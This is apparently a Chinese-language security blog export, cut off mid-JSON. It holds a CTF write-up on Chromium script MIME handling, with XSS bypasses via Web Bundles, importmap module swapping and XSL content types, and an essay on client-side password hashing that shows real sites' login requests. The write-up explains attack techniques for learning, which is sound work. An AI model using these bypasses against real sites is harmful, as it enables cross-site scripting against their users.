的 content type 是 application/octet-stream 的話，Chrome 會直接噴錯給你看： Refused to execute script from ‘https://uploader.c.hc.lc/uploads/xxx‘ because its MIME type (‘application&#x2F;octet-stream’) is not executable, and strict MIME type checking is enabled. 所以這題的目標很明確，要找到一個沒有包含 script 但是瀏覽器又可以成功載入的 MIME type。 看到這題以後，我先去找了 Chromium 的原始碼來看，可以用 Google search 的方式搭配剛剛的錯誤訊息會比較好找：&quot;strict MIME type checking is enabled&quot; site:https://chromium.googlesource.com/ 透過搜尋結果，可以直接定位到這個檔案：https://chromium.googlesource.com/chromium/blink/+/refs/heads/main/Source/core/dom/ScriptLoader.cpp 不過這檔案已經很舊了，但至少我們知道它屬於 blink 的一部份，因此可以到 Chromium 的 blink 裡面去找類似的檔案，可以找到 third_party&#x2F;blink&#x2F;renderer&#x2F;core&#x2F;script&#x2F;script_loader.cc 把新舊稍微對照之後，可以找到 IsValidClassicScriptTypeAndLanguage 這個函式： // &lt;specdef href=\"https://html.spec.whatwg.org/C/#prepare-a-script\"> bool IsValidClassicScriptTypeAndLanguage( const String&amp; type, const String&amp; language, ScriptLoader::LegacyTypeSupport support_legacy_types) &#123; // FIXME: IsLegacySupportedJavaScriptLanguage() is not valid HTML5. It is used // here to maintain backwards compatibility with existing web tests. The // specific violations are: // - Allowing type=javascript. type= should only support MIME types, such as // text/javascript. // - Allowing a different set of languages for language= and type=. language= // supports Javascript 1.1 and 1.4-1.6, but type= does not. if (type.IsNull()) &#123; // &lt;spec step=\"8\">the script element has no type attribute but it has a // language attribute and that attribute's value is the empty string, // or&lt;/spec> // // &lt;spec step=\"8\">the script element has neither a type attribute // nor a language attribute, then&lt;/spec> if (language.IsEmpty()) return true; // &lt;spec step=\"8\">Otherwise, the element has a non-empty language attribute; // let the script block's type string for this script element be the // concatenation of the string \"text/\" followed by the value of the language // attribute.&lt;/spec> if (MIMETypeRegistry::IsSupportedJavaScriptMIMEType(\"text/\" + language)) return true; // Not spec'ed. if (MIMETypeRegistry::IsLegacySupportedJavaScriptLanguage(language)) return true; &#125; else if (type.IsEmpty()) &#123; // &lt;spec step=\"8\">the script element has a type attribute and its value is // the empty string, or&lt;/spec> return true; &#125; else &#123; // &lt;spec step=\"8\">Otherwise, if the script element has a type attribute, let // the script block's type string for this script element be the value of // that attribute with leading and trailing ASCII whitespace // stripped.&lt;/spec> if (MIMETypeRegistry::IsSupportedJavaScriptMIMEType( type.StripWhiteSpace())) &#123; return true; &#125; // Not spec'ed. if (support_legacy_types == ScriptLoader::kAllowLegacyTypeInTypeAttribute &amp;&amp; MIMETypeRegistry::IsLegacySupportedJavaScriptLanguage(type)) &#123; return true; &#125; &#125; return false; &#125; 接著拿 IsSupportedJavaScriptMIMEType 再去搜尋一波，就可以找到 third_party&#x2F;blink&#x2F;common&#x2F;mime_util&#x2F;mime_util.cc，裡面就能看到支援的 MIME type： // Support every script type mentioned in the spec, as it notes that \"User // agents must recognize all JavaScript MIME types.\" See // https://html.spec.whatwg.org/#javascript-mime-type. const char* const kSupportedJavascriptTypes[] = &#123; \"application/ecmascript\", \"application/javascript\", \"application/x-ecmascript\", \"application/x-javascript\", \"text/ecmascript\", \"text/javascript\", \"text/javascript1.0\", \"text/javascript1.1\", \"text/javascript1.2\", \"text/javascript1.3\", \"text/javascript1.4\", \"text/javascript1.5\", \"text/jscript\", \"text/livescript\", \"text/x-ecmascript\", \"text/x-javascript\", &#125;; 從註解中也能看到 spec 的位置，給出的列表是一樣的，而這個列表基本上就是第一題的答案，上面這些 MIME type 都可以被載入為 script。 不過我們可以發現一件事情，那就是每一個 MIME type 都有包含 script。 當時做到這邊我就卡住了，後來作者有釋出提示，叫做 Origin trials，循線可以找到一個正在實驗中的功能叫做 Web Bundles，這個就是這題的解答。 什麼是 Web Bundles 呢？ 簡單來說呢，Web Bundle 就是把一堆資料（HTML, CSS, JS…）打包在一起，變成一個 .wbn 的檔案，上面的文章有講到一個範例，例如說你朋友在沒有網路的環境下想分享一個單機版的網頁遊戲給你，一般來說是做不到的（先不考慮你在自己電腦上架個 server 之類的）。 但透過 Web Bundle，它可以把遊戲打包成一個 .wbn 檔再傳給你，你收到以後只要丟到瀏覽器裡面就可以打開了，就像一個 app 的那種感覺。 除了載入整個 app 以外，也可以從 Web Bundle 中載入特定資源，這邊有完整的介紹：Explainer: Subresource loading with Web Bundles，範例長這樣： &lt;script type=\"webbundle\"> &#123; \"source\": \"https://example.com/dir/subresources.wbn\", \"resources\": [\"https://example.com/dir/a.js\", \"https://example.com/dir/b.js\", \"https://example.com/dir/c.png\"] &#125; &lt;/script> 透過這樣的方式，當你在網頁中載入 https://example.com/dir/a.js 的時候，瀏覽器就會先去 subresources.wbn 當中尋找這個資源，而不是直接去 server 下載。 所以開頭提到的那題 XSS 挑戰，答案就是這個，你把想要載入的 JS 包到 web bundle 裡面去，它的 MIME type 是 application/webbundle，所以不會被擋下來。 接著像上面那樣載入，從 web bundle 裡面載入的 JS 檔案 MIME type 會是正確的，所以可以成功執行。 不過，為什麼我們剛剛在看 Chromium 程式碼的時候沒看到這個功能呢？ 這是因為我們太執著在 MIME type 這件事情，所以只看 IsValidClassicScriptTypeAndLanguage，但其實要看的應該是呼叫它的 GetScriptTypeAtPrepare： ScriptLoader::ScriptTypeAtPrepare ScriptLoader::GetScriptTypeAtPrepare( const String&amp; type, const String&amp; language, LegacyTypeSupport support_legacy_types) &#123; if (IsValidClassicScriptTypeAndLanguage(type, language, support_legacy_types)) &#123; &#x2F;&#x2F; &lt;spec step&#x3D;&quot;8&quot;&gt;... If the script block&#39;s type string is a JavaScript MIME &#x2F;&#x2F; type essence match, the script&#39;s type is &quot;classic&quot;. ...&lt;&#x2F;spec&gt; return ScriptTypeAtPrepare::kClassic; &#125; if (EqualIgnoringASCIICase(type, script_type_names::kModule)) &#123; &#x2F;&#x2F; &lt;spec step&#x3D;&quot;8&quot;&gt;... If the script block&#39;s type string is an ASCII &#x2F;&#x2F; case-insensitive match for the string &quot;module&quot;, the script&#39;s type is &#x2F;&#x2F; &quot;module&quot;. ...&lt;&#x2F;spec&gt; return ScriptTypeAtPrepare::kModule; &#125; if (EqualIgnoringASCIICase(type, script_type_names::kImportmap)) &#123; return ScriptTypeAtPrepare::kImportMap; &#125; if (EqualIgnoringASCIICase(type, script_type_names::kSpeculationrules)) &#123; return ScriptTypeAtPrepare::kSpeculationRules; &#125; if (EqualIgnoringASCIICase(type, script_type_names::kWebbundle)) &#123; return ScriptTypeAtPrepare::kWebBundle; &#125; &#x2F;&#x2F; &lt;spec step&#x3D;&quot;8&quot;&gt;... If neither of the above conditions are true, then &#x2F;&#x2F; return. No script is executed.&lt;&#x2F;spec&gt; return ScriptTypeAtPrepare::kInvalid; &#125; 可以看到呼叫 IsValidClassicScriptTypeAndLanguage 只是第一步，後面還有其他步驟，可以傳入其他 type，而這剛好就是問題二的解答。 問題二：&lt;script&gt; 能接受的 type會思考這題是因為 PlaidCTF 2022 裡面有一題 YACA，就是在考這個點，官方解答在這：https://github.com/zwade/yaca/tree/master/solution 在做這題的時候我完全忘記以前做過 Web Bundle 那題，所以沒有往這方向去找。但總之呢，從剛剛貼的程式碼可以看出這題的答案就是第一題的答案（那一堆 MIME type）加上底下四個 type： module importmap speculationrules webbundle module 這個沒什麼好講的，webbundle 剛剛也提過了，底下我們來看看 importmap 跟 speculationrules 這兩個東西。 import map 的規格在這：https://github.com/WICG/import-maps 簡單來說呢，import map 想解決的問題很簡單，就是現在雖然瀏覽器已經支援 module 跟 import 了，但你還是沒辦法在瀏覽器上這樣做： import moment from \"moment\"; import &#123; partition &#125; from \"lodash\"; 你只能寫一個路徑之類的： import moment from \"/node_modules/moment/src/moment.js\"; import &#123; partition &#125; from \"/node_modules/lodash-es/lodash.js\"; 而 import map 的解法是引入一個對照表，就可以只用名稱來引入： &lt;script type=\"importmap\"> &#123; \"imports\": &#123; \"moment\": \"/node_modules/moment/src/moment.js\", \"lodash\": \"/node_modules/lodash-es/lodash.js\" &#125; &#125; &lt;/script> 而開頭提到的題目就是利用這點，用對照表來替代載入的檔案，像這樣： &lt;script type=\"importmap\"> &#123; \"imports\": &#123; \"/js/ast-to-js.mjs\": \"/js/eval-code.mjs\" &#125; &#125; &lt;/script> 接著我們來看 speculationrules，規格在這：https://github.com/WICG/nav-speculation 這個功能主要是想解決 pre-rendering 所造成的一些問題，我還沒有深入研究，但用起來像是這樣： &lt;script type=\"speculationrules\"> &#123; \"prerender\": [ &#123;\"source\": \"list\", \"urls\": [\"/page/2\"], \"score\": 0.5&#125;, &#123;\"source\": \"document\", \"if_href_matches\": [\"https://*.wikipedia.org/**\"], \"if_not_selector_matches\": [\".restricted-section *\"], \"score\": 0.1&#125; ] &#125; &lt;/script> 就是用 JSON 的方式來制定 pre-render 的規則，跟以前用 &lt;link rel=&quot;prerender&quot;&gt; 的方式滿不一樣的。 問題三靈感一樣來自於 CTF，Securinets CTF Quals 2022 的 PlanetSheet，當 content type 是 text/xsl 的時候，可以用 &lt;x:script&gt; 來執行 XSS。 每篇 writeup 中都有提到這個經典的研究：Content-Type Research ，細節可以點進去看，底下這五個 content type 在所有瀏覽器下都可以執行 XSS： text&#x2F;html application&#x2F;xhtml+xml application&#x2F;xml text&#x2F;xml image&#x2F;svg+xml 我好奇去找了一下 Chromium 的程式碼，發現還有另外兩個 content type 總是跟其他的被放在一起： application&#x2F;rss+xml application&#x2F;atom+xml 程式碼：xsl_style_sheet_resource.cc static void ApplyXSLRequestProperties(FetchParameters&amp; params) &#123; params.SetRequestContext(mojom::blink::RequestContextType::XSLT); params.SetRequestDestination(network::mojom::RequestDestination::kXslt); &#x2F;&#x2F; TODO(japhet): Accept: headers can be set manually on XHRs from script, in &#x2F;&#x2F; the browser process, and... here. The browser process can&#39;t tell the &#x2F;&#x2F; difference between an XSL stylesheet and a CSS stylesheet, so it assumes &#x2F;&#x2F; stylesheets are all CSS unless they already have an Accept: header set. &#x2F;&#x2F; Should we teach the browser process the difference? DEFINE_STATIC_LOCAL(const AtomicString, accept_xslt, (&quot;text&#x2F;xml, application&#x2F;xml, application&#x2F;xhtml+xml, &quot; &quot;text&#x2F;xsl, application&#x2F;rss+xml, application&#x2F;atom+xml&quot;)); params.MutableResourceRequest().SetHTTPAccept(accept_xslt); &#125; 不過這兩個並不會被當做 XML 載入，於是我找了一下，找到這個 bug：Issue 104358: Consider allowing more types to parse as XML，裡面提到了這個 2009 就新增的 commit，新增了底下的程式碼： if (mime_type &#x3D;&#x3D; &quot;application&#x2F;rss+xml&quot; || mime_type &#x3D;&#x3D; &quot;application&#x2F;atom+xml&quot;) &#123; &#x2F;&#x2F; Sad face. The server told us that they wanted us to treat the response &#x2F;&#x2F; as RSS or Atom. Unfortunately, we don&#39;t have a built-in feed previewer &#x2F;&#x2F; like other browsers. We can&#39;t just render the content as XML because &#x2F;&#x2F; web sites let third parties inject arbitrary script into their RSS &#x2F;&#x2F; feeds. That leaves us with little choice but to practically ignore the &#x2F;&#x2F; response. In the future, when we have an RSS feed previewer, we can &#x2F;&#x2F; remove this logic. mime_type.assign(&quot;text&#x2F;plain&quot;); response_-&gt;response_head.mime_type.assign(mime_type); &#125; 因為 RSS feed 有可能會包含第三方的東西，如果直接當 XML 來 render 的話會用 XSS 的風險，所以這兩個就被強制關掉了。 最後筆記一下一個可以幫忙搜尋原始碼的工具，超好用：https://sourcegraph.com/search","link":"/2022/04/24/script-type/"},{"title":"網站前端打 API 時把密碼加密，有意義嗎？","text":"最近有人在臉書前端交流社群發了一則貼文，內容是他看到了一個問題：請問登入api傳賬號、密碼json明碼會有問題嗎?，想知道大家對這個問題的看法。 而底下的回答大部份都是覺得「有用 HTTPS 就好了，沒必要額外再實作一層加密，沒有什麼太大的意義」 老實說我以前也是這樣認為的，而且過去在社群中就有出現過類似的討論。我那時候想說都已經有 HTTPS 了，而 HTTPS 本身的目的就是為了保障傳輸的安全，為什麼要自己再做加密？ 但這一兩年接觸資安以後，我的想法有了改變，我認為前端在傳輸前把密碼加密，是有其意義的，而接下來我會詳細說明我的理由。 2025&#x2F;12&#x2F;04 更新： 先寫結論在前面給懶得看完的人： 前端 hash 密碼，唯一的目的就是「保護使用者的原始密碼不外流」，儘管 HTTPS 是安全的，但明文密碼依舊傳到了你的 server，誰知道你的 server log 會不會記下來，然後外洩被拿去別的服務撞庫。 如果要做的話，成本低的做法是前端搭配 server 傳來的 salt 先在使用者端把密碼 hash 一次，傳到 server 後，server 再加一次 salt 後 hash，所以前後端都要 salt + hash，防止彩虹表，也能讓 server 根本不知道 user 的原始密碼。 若是想要更安全，「讓 server 不知道使用者原始密碼也能做驗證」這件事已經有更完整的方案了，如 Secure Remote Password (SRP) Protocol 或是 OPAQUE 定義問題在進入正題之前，我想把問題定義得更明確一點，免得出現一堆張飛打岳飛，拿兩個完全不同的情境來比較的狀況。在原文底下，就有不少留言在討論的是不同的問題，把問題先定義清楚滿重要的。 首先，我們要比較的對象是： 在使用 HTTPS 的前提下，打登入 API 時不做任何事直接傳送密碼的明文 在使用 HTTPS 的前提下，打登入 API 時先把密碼加密，再傳送到 server 這邊需要注意的是「兩個狀況都是 HTTPS」，所以如果你想講的是「沒必要自己發明新技術」或是「自己發明新的加密方式不會比較安全」等等，在這個前提下全都不適用。 因為傳輸層還是靠 HTTPS 在傳輸，所以在這個階段並沒有自己發明新的方式，我只是在應用層自己把傳輸的資料額外加密一層而已。 再來，先不考慮成本這件事，純粹只從技術的角度去看可能有哪些優缺點（成本相關的最後再來討論）。 然後這篇也不討論「保護帳號安全」這件事情，純粹在討論「保護密碼」。舉例來說，有人會講說：「密碼加密有什麼用？多此一舉而已，先做 2FA 比較實在」，這種就是超出範圍的討論。2FA 或 MFA 屬於「保護帳號安全」，就算密碼被偷走，攻擊者也會被其他驗證所擋住，因此沒有辦法登入進去帳號。 這與「保護密碼」是完全不同的兩件事情，因為實作 MFA 對於保護密碼沒什麼幫助。很簡單就可以假設出一種狀況是雖然攻擊者無法登入帳號，但密碼明文還是被偷走了。 使用者可能會在多個服務使用同一組密碼，當使用者在你網站的密碼被偷走，影響到的不只是他在這邊的帳號，還有可能影響到其他服務，這就是為什麼我們在討論「保護密碼」。 最後呢，我這邊的情境是「加密密碼」而非 hash，這是因為我覺得 hash 的狀況比較複雜，我自己想先用加密來舉例，而且這個加密是「非對稱式加密」（放心，文章後半段還是會提到 hash 的做法）。 也就是我們可以想像已經有一把 public key 存在於 client 端（當然，每個人都可以拿得到），在送出 request 以前，會先使用 JavaScript 把密碼用 public key 加密以後再送出，而 server 使用 private key 解密，拿到密碼以後 hash 過再存入資料庫中。 綜合以上，這篇想處理的問題是：「已經使用了 HTTPS，在打登入 API 以前先把密碼加密過或是不做任何處理，這兩者的差別在哪？」 而我們可以把回答分成兩個部分： 假設 HTTPS 被破解了，是不安全的，差在哪？ 假設 HTTPS 是安全的，差在哪？ 假設 HTTPS 不安全，差在哪？首先，可以先想一下怎樣的狀況會造成 HTTPS 不安全，攻擊者掌握了系統的哪些部分？ 底下簡單分為四種狀況討論： 攻擊者掌控整台電腦，信任惡意憑證 攻擊者成功執行了中間人攻擊 攻擊者可以在網路層監聽 request 並使用漏洞取得明文 攻擊者直接針對 HTTPS server 進行攻擊 攻擊者掌控整台電腦，信任惡意憑證若是這種類型的狀況，那當然是有沒有加密都沒差，因為攻擊者都有其他更好的手段去取得你的密碼。 攻擊者成功執行了中間人攻擊那如果是「攻擊者成功執行了中間人攻擊（Man-In-The-Middle）」呢？你的電腦沒事，只是封包在傳輸的過程中被中間人攻擊。 在這樣的前提底下，沒加密的情形就能直接被獲取密碼，而有加密的情形攻擊者只能獲取到加密過的密文而非明文。但需要注意的是既然是叫中間人攻擊，那攻擊者除了監聽你的 request 以外，也能傳送偽造的 response 給你，把前端用來加密密碼的部分換掉。 因此無論密碼是否加密，攻擊者都可以拿到明文，只是如果有加密的話，攻擊者取得密碼的成本較高（需要先找到在哪邊加密的，然後把那段改掉）。 （話說 HTTPS 要被中間人攻擊的前提也很難滿足就是了，一樣要使用者主動信任惡意憑證，或是 server 端的憑證被入侵） 攻擊者可以在網路層監聽 request 並使用漏洞取得明文這個狀況跟上一個的不同之處在於這個只能讀，不能寫。若是有辦法解密 request 的封包，就能夠看到明文。 所以如果有把密碼先加密，攻擊者就無法取得密碼的明文。 這邊需要注意的是儘管無法取得明文，攻擊者依然可以透過重送請求來登入你的帳號（先假設沒有其他機制），所以你帳號還是被盜了，只是攻擊者不知道你的密碼明文。 這有差嗎？有！ 假設他知道了你的密碼明文，就可以拿你的這組帳號密碼去各個服務都試試看，若是你其他網站也用同一組帳號密碼，就會跟著淪陷（俗稱的撞庫攻擊）。 因此在這個狀況底下，加密密碼的安全性顯然是更高的。 此時你可能會想問的問題是：「那在什麼狀況下攻擊者能夠取得 HTTPS 的明文？真的有可能嗎？」 這邊有一份美國衛生及公共服務部 HHS 所做的簡報：SSL&#x2F;TLS Vulnerabilities，裡面有記錄一些 SSL&#x2F;TLS 曾經有過的漏洞，所以取得 HTTPS 的明文確實是有可能的。 不過光是知道「有可能」是不夠的，應該問的是「機率高嗎？」，在討論風險的時候，通常也會根據風險的高低以及嚴重程度來決定該怎麼處理這個風險。 答案是「機率很低」，簡報裡的漏洞最近的已經是 2017 年的事情了，而且是使用一些舊的、有問題的加密演算法，除此之外還需要符合不少其他條件，才能執行攻擊，所以我認為機率確實是很低的。 以 2016 年發表的 DROWN(Decrypting RSA with Obsolete and Weakened eNcryption) 來說，Server 要支援 SSLv2，而攻擊者要能抓到加密過的 TLS connection，符合這些條件以後，進行一大堆運算後就可以解開 900 個 connection 中的 1 個，而運算成本在當時是 440 美金，約 13k 台幣。 總之呢，針對這個狀況，我們可以說： 假設攻擊者可以取得 HTTPS 的明文，那確實自己在應用層加密會更安全，但要符合這個假設的成本很高，發生機率很低 攻擊者直接針對 HTTPS server 進行攻擊這個分類我指的是在 2014 年發生過的 Heartbleed 漏洞，攻擊者可以藉由 OpenSSL 的漏洞讀取到 server 的記憶體。 這個狀況跟上一個滿像的，如果有在 client 端先加密過密碼，那攻擊者在 server 上讀到的就是加密過後的，不知道密碼明文是什麼。 所以結論跟上個一樣，就是加密密碼會更安全。 中場總結剛剛我們討論了幾種「HTTPS 變得不安全」的狀況，從以往發生過的案例可以得知「HTTPS 變得不安全」是有可能的。若是攻擊者能夠讀到 HTTPS 傳輸的明文，那在應用層將密碼加密，就能防止攻擊者取得密碼的明文，因此會比沒有加密來得更安全。 如果要講得更詳細，可以從兩個維度去切入，一個是嚴重性（severity），另一個是可能性（possibility）。 以嚴重性來說，不管有沒有加密密碼，只要攻擊者有辦法拿到 request 的內容，你的帳號就已經淪陷了，而有沒有加密唯一的差別只有攻擊者是否能取得明文密碼，有的話就可以執行撞庫攻擊，拿密碼去試更多其他的網站。 而可能性就是「HTTPS 的明文被拿到」這件事的可能性，從過往的經歷以及研究來看，雖然是有可能的，但在 2023 年的今天，機率是很低的。 因此我們現階段的結論應該是： 攻擊者若是可以繞過 HTTPS 拿到明文的 request，那在應用層將密碼加密，確實會比較安全，但要注意的是要達成這個前提非常困難，發生的機率極低。 假設 HTTPS 是安全的接下來我們討論第二種狀況，那就是假設 HTTPS 是安全的，沒有任何人可以從中間看到明文的內容，這應該也是留言區中大多數人假設的前提。 在這種狀況下，會有哪些風險呢？ 有一個現實生活中會發生，而且也確實發生過的風險，那就是 logging。 身為前端工程師，在前端加裝一些 error tracking 的服務是很合理的事情，若是我們直接實作一個「只要伺服器回傳 5xx，就把 request 記錄起來」的機制，如果好巧不巧哪天登入的 API 出現這個狀況，你就可以在 log 裡面看到使用者的明文密碼。 而且不只前端，後端也可能有類似的機制，碰到一些問題就把 request 整個寫到 log 檔去，方便以後查看以及 debug，一不小心密碼就可能被寫進去。 在這種狀況下，在 client 端先把密碼加密顯然是有好處的，那就是在這些錯誤處理的 log 中，被記錄下來的密碼會是密文，除非你有密鑰，否則你是不會知道使用者的密碼的。 我在網路上找到一篇跟我論點一樣的文章：The case for client-side hashing: logging passwords by mistake，裡面有附上很多參考連結，都是以前各大公司不小心把密碼的明文記錄下來的案例。 然後有個小地方稍微講一下，上面這篇做的是「在 client 端 hash」，跟我這篇一開始設定的「在 client 端做非對稱式加密」有點不同，hash 會更安全一點，確保在 server 真的沒人知道你的密碼明文是什麼。 總之呢，在 client 端先把密碼加密或是 hash，可以避免在日誌中不小心出現使用者的密碼明文，這個顯然是個額外的優點。 加密還是 hash？文章開頭我有提到 hash 的狀況有些複雜，所以我先把情境設定在「對密碼做非對稱式加密」再傳輸，因為對上面我舉的那些例子而言，這兩種情境的差異不大。 舉例來說，HTTPS 被拿到明文內容，無論你對密碼做了非對稱式加密還是雜湊，在攻擊者無法取得伺服器端密鑰的前提之下，都是拿不到明文密碼的。 那為什麼 hash 的狀況有些複雜呢？ 假設我們在前端先把密碼 hash 過後再傳到後端，那後端是要直接存進去資料庫嗎？如果直接存進去資料庫，哪天資料庫的內容曝光，攻擊者就拿到這些 hash 過的密碼了。 通常在有加鹽以及雜湊演算法夠強的前提之下，被拿到 hash 的密碼還是能保證一定的安全性，可是在這種情況下，反而變得很不安全。 因為前端傳給後端的內容已經是 hash 過的了，所以攻擊者可以直接拿 hash 過的密碼進行登入，根本不用知道明文是什麼。雖然保護了明文，但失去了原本雜湊的安全性。 因此如果要做 client side hashing，server side 收到後也要再做一次。如此一來，就算資料庫被偷走，攻擊者也沒辦法利用資料庫中的 hash 直接登入。 有些人可能跟我一樣好奇：「做兩次 hash 不會更不安全嗎？」，我們可以看一下 Google 在 Modern password security for system designers 裡面怎麼說： Have the client computer hash the password using a cryptographically secure algorithm and a unique salt provided by the server. When the password is received by the server, hash it again with a different salt that is unknown to the client. Be sure to store both salts securely. If you are using a modern and secure hashing algorithm, repeated hashing does not reduce entropy. 看起來是還好，問題不大。 （感謝 HowardCsie 的留言補充，並不是所有的 hash 演算法都不會有問題，可參考：Password Storage Cheat Sheet 與 Security Issue: Combining Bcrypt With Other Hash Functions 這兩篇文章） 總之呢，看起來最安全的但也更複雜的解法就是 client side 先 hash 一次，然後丟到 server 的時候再 hash 一次存進資料庫，如此一來就可以保證： HTTPS 因為各種原因失效時，攻擊者無法取得明文密碼 在 Server 端，沒有任何人知道使用者的明文密碼 明文密碼不會因為人為失誤被記錄到 log 中 那如果真的比較好用，為什麼沒人在用？ 現實生活中，到底有誰在前端做 hash 或是加密？當我一開始碰到這個問題，講出「怎麼沒人在用」的時候，其實只是「我自己沒碰過有人這樣用」，但實際上我並不知道那些知名網站的登入是怎麼做的。 因此呢，我就直接去看了幾個知名網站的登入機制，我們一起來看一下結果，為了方便觀看，我把跟帳號密碼無關的內容都拿掉了。 我在測試的時候，基本上都是用 test 或是 &#x74;&#101;&#115;&#x74;&#x40;&#x74;&#101;&#x73;&#116;&#x2e;&#99;&#111;&#x6d; 搭配簡單的密碼如 1234 在測試，然後觀察 request 的內容。 先來看一下 FAANG 吧！ FAANGFacebookAPI 網址：https://zh-tw.facebook.com/login 請求內容： email&#x3D;test@test.com encpass&#x3D;#PWD_BROWSER:5:1673256089:AbJQAJUvZZNvh2dZbeDqdu9dp7HWwyHOl3+0sCGjiHMMjvYdxJokpdHE&#x2F;O+E5LIbnakRmDWQfV40ZaB31MaNXFYo1b+RI+LHh6MAdDPa4PJ+BesDp4u8B4F4diVQ+q7idbEhT5wTNaU&#x3D; 沒想到 Facebook 就是有實作前端加密的網站！後面那段 Base64 並不是直接把密碼 Base64，而是把加密過的密碼做 Base64，解出來是這樣：\\x01²P\\x00\\x95/e\\x93o\\x87gYmàêvï]§±ÖÃ!Î\\x97\\x7F´°!£\\x88s\\f\\x8Eö\\x1DÄ\\x9A$¥ÑÄüï\\x84ä²\\x1B\\x9D©\\x11\\x985\\x90&#125;^4e wÔÆ\\x8D\\\\V(Õ¿\\x91#âÇ\\x87£\\x00t3Úàò~\\x05ë\\x03§\\x8B¼\\x07\\x81xv%Pú®âu±!O\\x9C\\x135¥ AmazonAPI 網址：https://www.amazon.com/ap/signin請求內容：email=test@test.com&amp;password=1234 AppleAPI 網址：https://idmsa.apple.com/appleauth/auth/signin請求內容：&#123;&quot;accountName&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;1234&quot;&#125; NetflixAPI 網址：https://www.netflix.com/tw/login請求內容：userLoginId=test@test.com&amp;password=1234 GoogleAPI 網址：https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute 請求內容： f.req&#x3D;[[[&quot;14hajb&quot;,&quot;[1,1,null,[1,null,null,null,[\\&quot;1234\\&quot;,null,true]]]] 看來 FAANG 裡面，只有 Facebook 是有實作的。 接著我突然好奇起其他常用服務的登入有沒有做，底下貼結果。 GitHubAPI 網址：https://github.com/session請求內容：login=test@test.com&amp;password=1234 MicrosoftAPI 網址：https://login.live.com/ppsecure/post.srf請求內容：login=test@test.com&amp;passwd=1234 IBM cloudAPI 網址：https://cloud.ibm.com/login/doLogin請求內容：&#123;&quot;username&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;1234&quot;&#125; 看來有實作的是少數，那資安廠商呢？資安廠商自己有做嗎？ 資安廠商KasperskyAPI 網址：https://eu.uis.kaspersky.com/v3/logon/proceed請求內容：&#123;&quot;login&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;12345678&quot;&#125; 趨勢API 網址：https://sso1.trendmicro.com/api/usersigninauth請求內容：&#123;&quot;email&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;12345678&quot;&#125; TenableAPI 網址：https://cloud.tenable.com/session請求內容：&#123;&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;1234&quot;&#125; Proton這個應該不算資安廠商，但突然很好奇強調隱私的 Proton 是怎麼做的，一看發現好像很複雜。 在登入的時候會先把 username 送過去，拿到一些看起來是 key 的東西。 API 網址：https://account.proton.me/api/auth/info &#123;&quot;Username&quot;:&quot;test@test.com&quot;&#125; &#123; &quot;Code&quot;:1000, &quot;Modulus&quot;:&quot;-----BEGIN PGP SIGNED MESSAGE-----\\nHash: SHA256\\n\\nu9K5yr97L9VV2ijOSI62tJcewUiRhQa8qJa24baNpGyw0lf3JLiF4fxUHqTErwF9UdoxE0z4Kb147naphylBFddyKsjhzHNcxk2rBw9haiPxD69BrVYm0n+LVlPqmjXFF7btr1H7oqHGX4b4Dy9omL&#x2F;KaZz&#x2F;Dco2NEhw0UBhEZbTAs6Ch01ur9XLbSOI7yb6MRsqCehfy82gDTdbPtXvqQsQjg5XoC2Ib2qTYFaU&#x2F;24mq&#x2F;gOaMbVuAGX0hBYzr5NpN9ol2XCdHOLg28Xe90+kisg39VV04axy7Ndvh489dC1CxjcWSSpXd6cPJyOn&#x2F;HH9aPeTZeucBllRGbPgwR6&#x2F;w&#x3D;&#x3D;\\n-----BEGIN PGP SIGNATURE-----\\nVersion: ProtonMail\\nComment: https:&#x2F;&#x2F;protonmail.com\\n\\nwl4EARYIABAFAlwB1j0JEDUFhcTpUY8mAAD1GwEAoC91QCSfXPEuWM13NZvy\\nvL9NQIABuSrVOvgJwMhUTnUBAPb4zbIdTYFOQNrPLvonJt2mmRNy4lGcW7uN\\n5yHzJ18J\\n&#x3D;Oykn\\n-----END PGP SIGNATURE-----\\n&quot;, &quot;ServerEphemeral&quot;:&quot;DY6eRYM1bqYZZ5jzZFdWv88tKYP2PnS0y4A+f7&#x2F;eqMXj8wB2VefV2kfIDrZ5AorWfDzBq4wMtNG2k5dzbT2qWppzpvltrSl2Nm4i8eWIRVxXWHl&#x2F;46dGuPXFHUcXBNMP3XEQvft0YEbHOPO9Es0RZRaObV5XPFyx6kzOJxXc1tIt4PfbhODMfsAoy&#x2F;yxt6eLN3HUiORCBOvzsH2sfG99Gx1YSAe3GL6g&#x2F;K+bdg59eglueXRESoB0&#x2F;VFRsvQevi9nVXx&#x2F;JZNTG0U4BBUOlMjpYYMgEP6eQgZZ&#x2F;09ZPYD3a2tW65mSnNt6lSDfwiKj02UuDqymTvj7mYm44T0SuAocwg&#x3D;&#x3D;&quot;, &quot;Version&quot;:4, &quot;Salt&quot;:&quot;dI7OcD+K4rGPBA&#x3D;&#x3D;&quot;, &quot;SRPSession&quot;:&quot;3fa6224285409b6af07c811971e05341&quot; &#125; 接著輸入密碼登入時，會送出如下的 request，看起來也很複雜： &#123; &quot;ClientProof&quot;:&quot;I9Nfd0Nd3OzODf2nt9zLxFHWogEwfRje8zjoeZnblyLfyzz23uXTjJ4qgRFomjIEEtZrlM1jTQa4wRIMGIIV7E6pMqq8c6wcc2tegP4Xt76S0EbnVtE1F9i0Wj46aCPUM0Mha3Zmgi9LKerrGlaftr2FBedjPFT9rPrbLqRQcFNMD33tn69gD&#x2F;p28q4RAr3&#x2F;7d&#x2F;tz7TYhytD5oxCAUwrkqiZOi0kg&#x2F;&#x2F;2mUJ9YNT2nWcgqUERoaU51NbNMcaPnMteEe1PlIJdiQbvNa5K07u8rk7itpBrGW2FP26bREp0UMTzNYM5HcDDkmp4dp9GoBjFJL9n0THUdt&#x2F;oRRJ&#x2F;Enj5WQ&#x3D;&#x3D;&quot;, 